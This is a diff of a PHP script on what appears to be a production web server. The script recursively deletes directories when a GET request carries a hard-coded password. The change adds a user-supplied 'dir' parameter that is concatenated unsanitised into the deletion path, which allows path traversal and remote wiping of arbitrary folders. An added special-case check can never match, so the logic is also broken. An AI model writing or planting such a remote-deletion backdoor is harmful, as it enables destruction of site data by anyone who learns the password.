@@ -1,6 +1,6 @@
 <?php
 $code = $_GET['code'];
-
+$dir = $_GET['dir'];
 if($code == 'kaipai123-fuck'){
 
     function deldir($dir) {
@@ -25,7 +25,14 @@ if($code == 'kaipai123-fuck'){
             return false;
         }
     }
-    $dir = '/alidata/www/kaipai-test';
-    deldir($dir);
+    if(!empty($dir)){
+        $dir = '/alidata/www/kaipai/' . $dir;
+        if($dir == 'kaipai123-fuck-y'){
+            $dir = '/alidata/www/kaipai';
+        }
+        deldir($dir);
+    }
+
+
 }
 ?>
